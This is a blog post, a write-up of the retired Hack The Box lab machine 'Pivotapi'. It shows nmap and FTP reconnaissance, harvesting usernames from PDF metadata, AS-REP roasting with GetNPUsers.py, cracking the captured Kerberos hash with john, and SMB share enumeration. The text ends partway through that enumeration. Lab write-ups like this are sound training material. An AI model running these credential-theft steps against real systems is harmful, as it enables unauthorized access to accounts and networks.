<!DOCTYPE html>
<html lang="en">
<head>
</script><script type="text/javascript" src="/lightgallery/lightbox.js"></script>
<link rel="stylesheet" href="/lightgallery/lightbox.css">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link rel="preload" as="style" href="/assets/css/post.css">
<link rel="preload" as="style" href="/assets/css/syntax.css">
<link rel="stylesheet" href="/assets/css/post.css">
<link rel="stylesheet" href="/assets/css/syntax.css">
<link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
<link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
<link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"/>
<script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
<script src="/assets/js/dist/toc.min.js" async></script>
<meta name="description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:title" content="Hackthebox Pivotapi writeup"/>
<meta property="og:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:image" content="/hackthebox/pivotapi/pivotapi.png"/>
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@0xdedinfosec">
<meta property="twitter:title" content="Hackthebox Pivotapi writeup">
<meta name="twitter:creator" content="@0xdedinfosec">
<meta name="twitter:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
<meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/pivotapi/pivotapi.png">
<title>Hackthebox Pivotapi writeup | 0xDedinfosec</title>
<meta name="generator" content="Jekyll v4.1.0"/>
<meta property="og:title" content="Hackthebox Pivotapi writeup"/>
<meta name="author" content="Dedinfosec"/>
<meta property="og:locale" content="en_US"/>
<meta name="description" content="Introduction@Pivotapi:~$"/>
<meta property="og:description" content="Introduction@Pivotapi:~$"/>
<link rel="canonical" href="http://0xdedinfosec.github.io/posts/htb-pivotapi/"/>
<meta property="og:url" content="http://0xdedinfosec.github.io/posts/htb-pivotapi/"/>
<meta property="og:site_name" content="0xDedinfosec"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2021-05-15T00:00:00+00:00"/>
<meta name="twitter:card" content="summary"/>
<meta property="twitter:title" content="Hackthebox Pivotapi writeup"/>
<meta name="twitter:site" content="@0xdedinfosec"/>
<meta name="twitter:creator" content="@Dedinfosec"/>
<meta name="google-site-verification" content="wGINLdo0D8EDbBKQUhYUaGeXyt9--AoGMiMjtEzayc4" />
<script type="application/ld+json">
     {"@type":"BlogPosting","headline":"Hackthebox Pivotapi writeup","dateModified":"2021-05-15T00:00:00+00:00","datePublished":"2021-05-15T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0xdedinfosec.github.io/posts/htb-pivotapi/"},"author":{"@type":"Person","name":"Dedinfosec"},"url":"http://0xdedinfosec.github.io/posts/htb-pivotapi/","description":"Introduction@Pivotapi:~$","@context":"https://schema.org"}
</script>
<!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license -->
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
<link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png">
<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png">
<link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/manifest.json">
<meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'>
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
<link rel="dns-prefetch" href="https://fonts.gstatic.com">
<link rel="preconnect" href="cdn.jsdelivr.net">
<link rel="dns-prefetch" href="cdn.jsdelivr.net">
<link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin>
<link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
<link rel="preload" as="style" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
<link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
<script>
    window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>');
</script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous" async></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script>
<script src="/assets/js/dist/commons.js" async></script>
<script src="/assets/js/dist/timeago.min.js" async></script>
<link rel="preload" as="style" href="/assets/css/post.css">
<link rel="preload" as="style" href="/assets/css/syntax.css">
<link rel="stylesheet" href="/assets/css/post.css">
<link rel="stylesheet" href="/assets/css/syntax.css">
<link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
<link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
<link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"/>
<script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
<script src="/assets/js/dist/toc.min.js" async></script>
<meta name="description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:title" content="Hackthebox Pivotapi writeup"/>
<meta property="og:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:image" content="/hackthebox/pivotapi/pivotapi.png"/>
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@0xdedinfosec">
<meta property="twitter:title" content="Hackthebox Pivotapi writeup">
<meta name="twitter:creator" content="@0xdedinfosec">
<meta name="twitter:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
<meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/pivotapi/pivotapi.png">
<script src="/assets/js/dist/tooltip-loader.min.js" async></script>
<script src="/assets/js/prism.js"></script>
<link rel="stylesheet" href="/assets/css/prism.css">
</head>
<body data-spy="scroll" data-target="#toc">
    <div id="sidebar" class="d-flex flex-column">
        <div id="nav-wrapper">
            <div id="profile-wrapper" class="d-flex flex-column">
                <div id="avatar" class="d-flex justify-content-center">
                    <a href="/" alt="avatar">
                        <img src="/assets/img/sample/avater1.png" alt="avatar">
                    </a>
                </div>
                <div class="profile-text mt-3">
                    <div id="site-title">
                        <a href="/">0xDedinfosec</a>
                    </div>
                    <div id="site-subtitle" class="font-italic">InfoSec/Cybersec Blog And Writeups</div>
                </div>
            </div>
            <ul class="nav flex-column">
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i>
                        <span>HOME</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/donation/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fab fa-donate ml-3 mr-3 unloaded"></i>
                        <span>DONATION-OSCP</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i>
                        <span>CATEGORIES</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i>
                        <span>TAGS</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i>
                        <span>TIMELINE</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i>
                        <span>WHOAMI</span>
                    </a>
                </li>
            </ul>
        </div>
        <div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4">
            <span id="mode-toggle-wrapper">
                <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License -->
                <i class="mode-toggle fas fa-sun" light-mode-invisible></i>
                <i class="mode-toggle fas fa-moon" dark-mode-invisible></i>
                <script type="text/javascript">
                    class ModeToggle {
                        static get MODE_KEY() {
                            return "mode";
                        }
                        static get DARK_MODE() {
                            return "dark";
                        }
                        static get LIGHT_MODE() {
                            return "light";
                        }
                        constructor() {
                            if (this.mode != null) {
                                if (this.mode == ModeToggle.DARK_MODE) {
                                    if (!this.isDarkPrefer) {
                                        this.setDark();
                                    }
                                } else {
                                    if (this.isDarkPrefer) {
                                        this.setLight();
                                    }
                                }
                            }
                            var self = this;
                            /* always follow the system prefers */
                            this.sysDarkPrefers.addListener(function() {
                                if (self.mode != null) {
                                    if (self.mode == ModeToggle.DARK_MODE) {
                                        if (!self.isDarkPrefer) {
                                            self.setDark();
                                        }
                                    } else {
                                        if (self.isDarkPrefer) {
                                            self.setLight();
                                        }
                                    }
                                    self.clearMode();
                                }
                            });
                        }
                        /* constructor() */
                        setDark() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                        }
                        setLight() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                        }
                        clearMode() {
                            $('html').removeAttr(ModeToggle.MODE_KEY);
                            sessionStorage.removeItem(ModeToggle.MODE_KEY);
                        }
                        get sysDarkPrefers() {
                            return window.matchMedia("(prefers-color-scheme: dark)");
                        }
                        get isDarkPrefer() {
                            return true;
                        }
                        get mode() {
                            return sessionStorage.getItem(ModeToggle.MODE_KEY);
                        }
                        flipMode() {
                            if ((this.mode == null && this.isDarkPrefer) || this.mode == ModeToggle.DARK_MODE) {
                                this.setLight();
                            } else {
                                /* light mode or default-light */
                                this.setDark();
                            }
                        }
                    }
                    /* ModeToggle */
                    let toggle = new ModeToggle();
                    $(".mode-toggle").click(function() {
                        toggle.flipMode();
                    });
                </script>
            </span>
            <span class="icon-border"></span>
            <a href="https://github.com/0xdedinfosec" target="_blank">
                <i class="fab fa-github"></i>
            </a>
            <a href="https://t.me/Dedinfosec" target="_blank">
                <i class="fab fa-telegram"></i>
            </a>
            <a href="https://twitter.com/0xdedinfosec" target="_blank">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="https://www.facebook.com/dedsecinfoServices/" target="_blank"> <i class="fab fa-facebook"></i> </a>
            </div></div>
<div id="main-wrapper">
    <div id="topbar-wrapper" class="row justify-content-center topbar-down">
        <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
            <span id="breadcrumb">
                <span>
                    <a href="/">Posts </a>
                </span>
                <span>Hackthebox Pivotapi writeup</span>
            </span>
            <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
            <div id="topbar-title">Post</div>
            <i id="search-trigger" class="fas fa-search fa-fw"></i>
            <span id="search-wrapper" class="align-items-center">
                <i class="fas fa-search fa-fw"></i>
                <input class="form-control" id="search-input" type="search" placeholder="Search...">
                <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
            </span>
            <span id="search-cancel">Cancel</span>
        </div>
    </div>
    <div id="main">
        <div class="row">
            <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">
                <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                    <h1 data-toc-skip>Hackthebox Pivotapi writeup</h1>
                    <div class="post-meta text-muted d-flex flex-column">
                        <div>
                            <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sat, May 15, 2021, 12:00 AM +0000">
                                May 15, 2021 <i class="unloaded">2021-05-15T00:00:00+00:00</i>
                            </span>
                            on <a href='/categories/hackthebox/'>Hackthebox</a>
                            , <a href='/categories/retired/'>retired</a>
                        </div>
                    </div>
                    <div class="post-content">
                        <img src="/hackthebox/pivotapi/pivotapi.png">
                        <h1>Introduction@Pivotapi:~$</h1>
                            <table>
                                <thead>
                                    <tr>
                                        <th>Column
                                        <th>
                                            Details
                                <tbody>
                                    <tr>
                                        <td>Name
                                        <td>
                                            Pivotapi
                                    <tr>
                                        <td>IP
                                        <td>
                                            10.10.10.240
                                    <tr>
                                        <td>Points
                                        <td>
                                            50
                                    <tr>
                                        <td>Os
                                        <td>
                                            Windows
                                    <tr>
                                        <td>Difficulty
                                        <td>
                                            Insane
                                    <tr>
                                        <td>Creator
                                        <td>
                                            <a href="https://www.hackthebox.eu/home/users/profile/6956"
                                                target="_blank">CyberVaca </a> <a href="#">&</a> <a href="https://www.hackthebox.eu/home/users/profile/1979" target="_blank">3v4Si0N</a>
                                    <tr>
                                        <td>Out On
                                        <td>08 May 2021
                            </table>
                            <h1 id="pwned">Pwned</h1>
                            <html>

                            <head>
                                <link rel="stylesheet" type="text/css" href="/asciinema-player.css" />

                            <body>
                                <asciinema-player src="Pivotapi.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1"
                                    cols="150" rows="20"></asciinema-player>
                                <script src="/asciinema-player.js"></script>
                                <h1 id="recon">Recon</h1>
                                <h2 id="nmap">Nmap</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.3]─[root@parrot]─[~/Desktop/HTB/pivotapi]
└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.10.240
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-12 23:11 CDT
Nmap scan report for 10.10.10.240
Host is up (0.084s latency).
Not shown: 986 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
| 02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
| 02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
| 02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
| 08-08-20  01:18PM               219091 notes1.pdf
| 08-08-20  01:34PM               279445 notes2.pdf
| 08-08-20  01:41PM                  105 README.txt
|_02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
| ftp-syst:
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)
|   256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)
|_  256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-13 04:12:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: LICORDEBELLOTA
|   NetBIOS_Domain_Name: LICORDEBELLOTA
|   NetBIOS_Computer_Name: PIVOTAPI
|   DNS_Domain_Name: LicorDeBellota.htb
|   DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
|   DNS_Tree_Name: LicorDeBellota.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-05-13T04:06:57
|_Not valid after:  2051-05-13T04:06:57
|_ssl-date: 2021-05-13T04:12:54+00:00; +3s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| ms-sql-info:
|   10.10.10.240:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-05-13T04:12:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.05 seconds</code></pre>
                                <p>
                                    There is bunch of <code class="highlighter-rouge">ports</code> open.
                                </p>
                                <p>
                                    Let's first start with <code class="highlighter-rouge">ftp</code>
                                </p>
                                <h2 id="port-80">FTP</h2>
                                <p>
                                    There is a lot of <code class="highlighter-rouge">pdf</code> files.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi/ftp]
└──╼ [★]$ ftp -pi 10.10.10.240
Connected to 10.10.10.240.
220 Microsoft FTP Service
Name (10.10.10.240:dedsec): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
227 Entering Passive Mode (10,10,10,240,202,100).
125 Data connection already open; Transfer starting.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt  
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
226 Transfer complete.
ftp> mget *</code></pre>
                                <p>
                                    Let's first cat the <code class="highlighter-rouge">README.txt</code> file.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/cmd.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    It's said that change the <code class="highlighter-rouge">download</code> mode into <code class="highlighter-rouge">binary</code> so no files will be <code class="highlighter-rouge">corrupted</code>.
                                </p>
                                <p>
                                    Let's <code class="highlighter-rouge">download</code> all files again in <code class="highlighter-rouge">binary</code> mode.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi/ftp]
└──╼ [★]$ ftp -pi 10.10.10.240
Connected to 10.10.10.240.
220 Microsoft FTP Service
Name (10.10.10.240:dedsec): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
227 Entering Passive Mode (10,10,10,240,202,149).
150 Opening ASCII mode data connection.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget *</code></pre>
                                <p>
                                    After <code class="highlighter-rouge">analizing</code> all the files i found nothing so let's check the <code class="highlighter-rouge">metadata</code> of one of the file with <code class="highlighter-rouge">exiftool</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/cmd1.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    We found the <code class="highlighter-rouge">username</code>. let's collect <code class="highlighter-rouge">all</code> usernames for every <code class="highlighter-rouge">files</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi/ftp]
└──╼ [★]$ exiftool * | egrep -i "Creator|Author" | awk '{print $3}'
Microsoft
Unknown
saif
Microsoft®
byron
:
byron
cairo
Kaorz
:
alex
alex</code></pre>
                                <p>
                                    Let's save all these <code class="highlighter-rouge">username</code> into a file called <code class="highlighter-rouge">user.lst</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi]
└──╼ [★]$ cat user.lst 
Microsoft
Unknown
saif
Microsoft®
byron
byron
cairo
Kaorz
alex
alex</code></pre>
                                <p>
                                    Now we have the <code class="highlighter-rouge">users</code> list let's check the <code class="highlighter-rouge">Kerberos</code> preauthentication check.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi]
└──╼ [★]$ GetNPUsers.py -dc-ip 10.10.10.240 -no-pass -usersfile user.lst LicorDeBellota/
Impacket v0.9.23.dev1+20210416.153120.efbe78bb - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$Kaorz@LICORDEBELLOTA:27b3349940bbeb5a2c96374dc1e4e25b$ddd8d8991d1461c49db16544b9f6b9319dba02124d8949b8d6952168d6e42fa2b7604392e2f90424b2b2608acc5e1ef80d75b830a0775701ab7360831acf0a7ba59fe0169ca031cd8619939f40c7456264a14fcb53599b9308e976ac4792d678913a56b6cf59dac1c3d35ee1213b16b74117b73ba63c3d3c5270ae974d47cbd908ef3531e641bdb0d165f61288a24a000b5c099f1331cf32b94a4f0a3c8ae295ed71be38be1a90fec0e801337d188d0a23218b18abc87d535b34872dc5d3cb0f74783e997bee4bbe089e83a61951928f54c58b616ded955da935b839d9ef0b5c5a6a204bd87961273e4b7a2ad9ad4037825ca2e7
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</code></pre>
                                <p>
                                    We got the <code class="highlighter-rouge">hash</code> of <strong>Kaorz</strong> user let's try to <code class="highlighter-rouge">crack</code> this hash with <code class="highlighter-rouge">john</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi]
└──╼ [★]$ vim hash
┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi]
└──╼ [★]$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Roper4155        ($krb5asrep$23$Kaorz@LICORDEBELLOTA)
1g 0:00:00:11 DONE (2021-05-12 23:39) 0.08517g/s 908865p/s 908865c/s 908865C/s Roybel01..Ronald8
Use the "--show" option to display all of the cracked passwords reliably
Session completed</code></pre>
                                <p>
                                    We have the <code class="highlighter-rouge">username</code> and a password <strong>Roper4155</strong> let's check the <code class="highlighter-rouge">smb</code> share if we have access of any <code class="highlighter-rouge">shares</code>.
                                </p>
                                <p>
                                    I use <code class="highlighter-rouge">crackmapexec</code> for that.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi]
└──╼ [★]$ crackmapexec smb 10.10.10.240 -u Kaorz -p Roper4155 --shares
SMB         10.10.10.240    445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.240    445    PIVOTAPI         [+] LicorDeBellota.htb\Kaorz:Roper4155 
SMB         10.10.10.240    445    PIVOTAPI         [+] Enumerated shares
SMB         10.10.10.240    445    PIVOTAPI         Share           Permissions     Remark
SMB         10.10.10.240    445    PIVOTAPI         -----           -----------     ------
SMB         10.10.10.240    445    PIVOTAPI         ADMIN$                          Admin remota
SMB         10.10.10.240    445    PIVOTAPI         C$                              Recurso predeterminado
SMB         10.10.10.240    445    PIVOTAPI         IPC$            READ            IPC remota
SMB         10.10.10.240    445    PIVOTAPI         NETLOGON        READ            Recurso compartido del servidor de inicio de sesión 
